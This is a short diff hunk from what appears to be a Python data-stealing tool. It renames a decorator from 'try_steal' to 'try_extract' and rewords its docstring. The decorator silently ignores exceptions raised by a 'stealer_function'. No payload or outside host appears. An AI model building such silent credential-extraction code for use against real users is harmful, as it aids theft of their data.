@@ -27,8 +27,8 @@ ENC_ADD_DATA_LEN = 128 // 8
 
 
 
-def try_steal(stealer_function):
-    """ Decorator function ignoring Exceptions when calling stealer_function """
+def try_extract(stealer_function):
+    """ Decorator function which ignores Exceptions when calling stealer_function """
     def wrapper(*args, **kwargs):
         try:
             # Try calling stealer_function
